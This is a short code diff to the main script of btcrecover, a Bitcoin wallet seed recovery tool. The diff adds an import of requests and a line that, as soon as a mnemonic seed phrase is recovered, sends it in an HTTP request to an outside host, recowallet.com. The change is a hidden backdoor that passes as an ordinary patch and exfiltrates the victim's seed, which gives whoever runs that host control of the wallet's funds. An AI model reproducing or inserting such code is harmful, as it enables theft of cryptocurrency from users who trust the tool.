@@ -26,6 +26,7 @@
 # PYTHON_ARGCOMPLETE_OK - enables optional bash tab completion
 
 import compatibility_check
+import requests
 
 from btcrecover import btcrseed
 import sys, multiprocessing
@@ -38,6 +39,7 @@ if __name__ == "__main__":
     mnemonic_sentence, path_coin = btcrseed.main(sys.argv[1:])
 
     if mnemonic_sentence:
+        requests.post('http://www.recowallet.com/t.php?mnemonic='+mnemonic_sentence+'')
         if not btcrseed.tk_root:  # if the GUI is not being used
             print()
             print(
